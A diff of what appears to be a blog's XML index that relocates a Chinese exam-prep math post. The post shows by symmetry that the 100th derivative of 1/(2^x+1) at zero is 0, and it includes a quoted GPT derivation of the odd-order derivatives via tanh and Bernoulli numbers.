-一阶导：$f’(-x) \cdot (-1) = -f’(x) \implies f’(-x) = f’(x)$所以 (f’(x)) 是偶函数。
-二阶导：对上式再求导：$f’’(-x) \cdot (-1) = f’’(x) \implies f’’(-x) = -f’’(x)$所以 (f’’(x)) 是奇函数。
-
-由此可以推得一般规律：$f^{(n)}(-x) = (-1)^{n+1} f^{(n)}(x)$
-第四步：代入 (x=0)
-令 (x=0)，得到：$f^{(n)}(0) = (-1)^{n+1} f^{(n)}(0)$
-若要使该等式成立：
-
-当 $(-1)^{n+1} = 1$，即 (n) 为奇数时，方程恒成立；
-当 $(-1)^{n+1} = -1$，即 (n) 为偶数时，必须 $f^{(n)}(0)=0$。
-
-第五步：结论
-因为 (100) 是偶数：
-
-\boxed{f^{(100)}(0) = 0}
-如果我想直接求导呢？好像确实可以，要用到双曲正切~
-下面的GPT给出的解法，我还没看懂：
-用一点恒等变换就能把“死算导数”变成有规律的公式，既能解释为什么偶数阶导数在 $0$ 为 $0$，也能写出任意奇阶导数的闭式表达（含伯努利数）。步骤和结论如下。
-先把 $2^x$ 写成指数形式并作代换：
-
-f(x)=\frac{1}{1+2^x}=\frac{1}{1+e^{ax}},\qquad a=\ln 2.利用双曲正切的恒等式
-
-\frac{1}{1+e^{y}}=\frac{1-\tanh\frac{y}{2}}{2},令 $y=ax$ 得
-
-f(x)=\frac{1}{2}-\frac{1}{2}\tanh\!\left(\frac{a}{2}x\right).记 $b=\frac{a}{2}=\frac{\ln 2}{2}$。于是
-
-f(x)=\frac{1}{2}-\frac{1}{2}\tanh(bx).由此得到两个直接结论：
-
-$\tanh(z)$ 是奇函数，故其泰勒展开只含奇次幂，说明所有偶阶导数在 $0$ 处为 $0$。因此对原函数：
-
-f^{(2m)}(0)=0\quad(m\ge1).这直接解释了为什么 $f^{(100)}(0)=0$。
-
-对奇阶导数，利用链式法则
-
-\frac{d^n}{dx^n}\tanh(bx)\bigg|_{x=0}=b^n\cdot \tanh^{(n)}(0),以及 $f^{(n)}(0)=-\frac{1}{2}$ 倍该值，可得奇阶的通项公式。
-
-
-
-奇阶导数的闭式（含伯努利数）已知泰勒展开（关于 $x$）：
-
-\tanh x=\sum_{k=1}^{\infty}\frac{2^{2k}(2^{2k}-1)B_{2k}}{(2k)!}\,x^{2k-1},其中 $B_{2k}$ 是伯努利数。由此得到对 $n=2k-1$（奇数）
-
-\tanh^{(2k-1)}(0)= (2k-1)!\cdot\frac{2^{2k}(2^{2k}-1)B_{2k}}{(2k)!}
-=\frac{2^{2k}(2^{2k}-1)B_{2k}}{2k}.因此对 $f$：
-
-\boxed{f^{(2k-1)}(0)=-\frac{1}{2}\,b^{2k-1}\,\tanh^{(2k-1)}(0)
-=-\frac{1}{2}\,b^{2k-1}\cdot\frac{2^{2k}(2^{2k}-1)B_{2k}}{2k},}稍整理可写成
-
-\boxed{f^{(2k-1)}(0)=-\frac{2^{2k-1}(2^{2k}-1)B_{2k}}{2k}\;b^{2k-1},}
-\quad\text{其中 }b=\frac{\ln2}{2}.
-验证前几项（直观感受规律）从已知的 $\tanh$ 展开：$\tanh x= x-\frac{x^3}{3}+\frac{2x^5}{15}-\frac{17x^7}{315}+\cdots$。
-
-$k=1$（一阶导）：$\tanh’(0)=1$，
-
-f'(0)=-\tfrac{1}{2} b\cdot 1=-\frac{b}{2}=-\frac{\ln2}{4}.
-$k=2$（三阶导）：$\tanh^{(3)}(0)=-2$（因为系数 $-1/3$ 对应 $3!(-1/3)=-2$），
-
-f^{(3)}(0)=-\tfrac{1}{2} b^{3}(-2)=b^{3}=\left(\frac{\ln 2}{2}\right)^3.
-$k=3$（五阶导）：系数 $2/15$ 对应 $\tanh^{(5)}(0)=16$，
-
-f^{(5)}(0)=-\tfrac{1}{2} b^5\cdot 16=-8\,b^5.
-
-
-总结
-偶数阶导数在 $0$ 都为 $0$（所以 $f^{(100)}(0)=0$）。
-
-奇数阶导数有明确闭式，且可用伯努利数写出通项：
-
-f^{(2k-1)}(0)=-\frac{2^{2k-1}(2^{2k}-1)B_{2k}}{2k}\left(\frac{\ln2}{2}\right)^{2k-1}.
-
-]]></content>
-      <categories>
-        <category>考研</category>
-      </categories>
-      <tags>
-        <tag>考研数学</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>记录一道泰勒公式相关的考研数学题</title>
     <url>/2024/09/15/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F%E7%9B%B8%E5%85%B3%E7%9A%84%E8%80%83%E7%A0%94%E6%95%B0%E5%AD%A6%E9%A2%98/</url>
     <content><![CDATA[今天，有个学长（烤盐糕守）发给了我一道树穴题（据说是刚出锅的热乎题）
@@ -9184,6 +9127,102 @@ f^{(2k-1)}(0)=-\frac{2^{2k-1}(2^{2k}-1)B_{2k}}{2k}\left(\frac{\ln2}{2}\right)^{2
 如果 $n$ 是非整数实数，$\sin(n \pi)$ 会在 $[-1, 1]$ 之间振荡。而由于 $n \pi$ 趋向无穷大，乘积 $n \pi \sin(n \pi)$ 是一个无穷大乘以振荡的值，无法直接确定这个极限。
 因此，严格来说，$\lim_{n \to \infty} n \pi \sin(n \pi)$ 是发散的，并不存在一个简单的极限值。如果我们只考虑 $n$ 为整数的情况，则结果为 $0$，否则该极限无法求出。
  $\lim_{n \to \infty} n \pi \sin(n \pi)$ 存在，当且仅当 $\lim_{x \to \infty} \sin(x)$ 存在；众所周知的，$f(x)=\sin(x)$ 既不收敛也不发散（在讨论整个序列时，极限存在与收敛实际上是等价的），故极限不存在
+]]></content>
+      <categories>
+        <category>考研</category>
+      </categories>
+      <tags>
+        <tag>考研数学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录一道很有意思的简单考研数学题（奇偶性相关）</title>
+    <url>/2025/10/23/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%AE%80%E5%8D%95%E8%80%83%E7%A0%94%E6%95%B0%E5%AD%A6%E9%A2%98%EF%BC%88%E5%A5%87%E5%81%B6%E6%80%A7%E7%9B%B8%E5%85%B3%EF%BC%89/</url>
+    <content><![CDATA[题目描述：设 $f(x)=\frac{1}{2^x+1},x\in \mathbb{R},$ 则$f^{(100)}(0)=?$（即100阶导数）
+学长听说我学完张宇第一章了，便给了我这道题检验学习成果
+第一章全是极限相关的，但对于这道题，我翻来覆去也没看出哪里和极限相关的
+于是乎只能硬导，企图寻找规律；奈何本人计算能力一般，算了三遍三阶导，每一遍都不一样
+于是乎我去请教学长，得知和奇偶性相关，于是记录一下做法
+简单地：$f(x)=\frac{1}{a^x+1}-\frac12$ 是奇函数，故而求导后是偶函数并且 $-\frac12$ 没了，这
+第一步：化简函数
+写成以 $e$ 为底：$f(x) = \frac{1}{e^{x \ln 2} + 1}$
+第二步：中心对称性
+$f(-x) = \frac{1}{2^{-x} + 1} = \frac{1}{\frac{1}{2^x} + 1} = \frac{2^x}{1 + 2^x}$
+注意到：$f(x) + f(-x) = \frac{1}{1+2^x} + \frac{2^x}{1+2^x} = 1$
+因此：$f(-x) = 1 - f(x)$
+第三步：推导对称性条件对导数的影响
+两边对 (x) 求导：
+
+一阶导：$f’(-x) \cdot (-1) = -f’(x) \implies f’(-x) = f’(x)$所以 (f’(x)) 是偶函数。
+二阶导：对上式再求导：$f’’(-x) \cdot (-1) = f’’(x) \implies f’’(-x) = -f’’(x)$所以 (f’’(x)) 是奇函数。
+
+由此可以推得一般规律：$f^{(n)}(-x) = (-1)^{n+1} f^{(n)}(x)$
+第四步：代入 (x=0)
+令 (x=0)，得到：$f^{(n)}(0) = (-1)^{n+1} f^{(n)}(0)$
+若要使该等式成立：
+
+当 $(-1)^{n+1} = 1$，即 (n) 为奇数时，方程恒成立；
+当 $(-1)^{n+1} = -1$，即 (n) 为偶数时，必须 $f^{(n)}(0)=0$。
+
+第五步：结论
+因为 (100) 是偶数：
+
+\boxed{f^{(100)}(0) = 0}
+如果我想直接求导呢？好像确实可以，要用到双曲正切~
+下面的GPT给出的解法，我还没看懂：
+用一点恒等变换就能把“死算导数”变成有规律的公式，既能解释为什么偶数阶导数在 $0$ 为 $0$，也能写出任意奇阶导数的闭式表达（含伯努利数）。步骤和结论如下。
+先把 $2^x$ 写成指数形式并作代换：
+
+f(x)=\frac{1}{1+2^x}=\frac{1}{1+e^{ax}},\qquad a=\ln 2.利用双曲正切的恒等式
+
+\frac{1}{1+e^{y}}=\frac{1-\tanh\frac{y}{2}}{2},令 $y=ax$ 得
+
+f(x)=\frac{1}{2}-\frac{1}{2}\tanh\!\left(\frac{a}{2}x\right).记 $b=\frac{a}{2}=\frac{\ln 2}{2}$。于是
+
+f(x)=\frac{1}{2}-\frac{1}{2}\tanh(bx).由此得到两个直接结论：
+
+$\tanh(z)$ 是奇函数，故其泰勒展开只含奇次幂，说明所有偶阶导数在 $0$ 处为 $0$。因此对原函数：
+
+f^{(2m)}(0)=0\quad(m\ge1).这直接解释了为什么 $f^{(100)}(0)=0$。
+
+对奇阶导数，利用链式法则
+
+\frac{d^n}{dx^n}\tanh(bx)\bigg|_{x=0}=b^n\cdot \tanh^{(n)}(0),以及 $f^{(n)}(0)=-\frac{1}{2}$ 倍该值，可得奇阶的通项公式。
+
+
+
+奇阶导数的闭式（含伯努利数）已知泰勒展开（关于 $x$）：
+
+\tanh x=\sum_{k=1}^{\infty}\frac{2^{2k}(2^{2k}-1)B_{2k}}{(2k)!}\,x^{2k-1},其中 $B_{2k}$ 是伯努利数。由此得到对 $n=2k-1$（奇数）
+
+\tanh^{(2k-1)}(0)= (2k-1)!\cdot\frac{2^{2k}(2^{2k}-1)B_{2k}}{(2k)!}
+=\frac{2^{2k}(2^{2k}-1)B_{2k}}{2k}.因此对 $f$：
+
+\boxed{f^{(2k-1)}(0)=-\frac{1}{2}\,b^{2k-1}\,\tanh^{(2k-1)}(0)
+=-\frac{1}{2}\,b^{2k-1}\cdot\frac{2^{2k}(2^{2k}-1)B_{2k}}{2k},}稍整理可写成
+
+\boxed{f^{(2k-1)}(0)=-\frac{2^{2k-1}(2^{2k}-1)B_{2k}}{2k}\;b^{2k-1},}
+\quad\text{其中 }b=\frac{\ln2}{2}.
+验证前几项（直观感受规律）从已知的 $\tanh$ 展开：$\tanh x= x-\frac{x^3}{3}+\frac{2x^5}{15}-\frac{17x^7}{315}+\cdots$。
+
+$k=1$（一阶导）：$\tanh’(0)=1$，
+
+f'(0)=-\tfrac{1}{2} b\cdot 1=-\frac{b}{2}=-\frac{\ln2}{4}.
+$k=2$（三阶导）：$\tanh^{(3)}(0)=-2$（因为系数 $-1/3$ 对应 $3!(-1/3)=-2$），
+
+f^{(3)}(0)=-\tfrac{1}{2} b^{3}(-2)=b^{3}=\left(\frac{\ln 2}{2}\right)^3.
+$k=3$（五阶导）：系数 $2/15$ 对应 $\tanh^{(5)}(0)=16$，
+
+f^{(5)}(0)=-\tfrac{1}{2} b^5\cdot 16=-8\,b^5.
+
+
+总结
+偶数阶导数在 $0$ 都为 $0$（所以 $f^{(100)}(0)=0$）。
+
+奇数阶导数有明确闭式，且可用伯努利数写出通项：
+
+f^{(2k-1)}(0)=-\frac{2^{2k-1}(2^{2k}-1)B_{2k}}{2k}\left(\frac{\ln2}{2}\right)^{2k-1}.
+
 ]]></content>
       <categories>
         <category>考研</category>
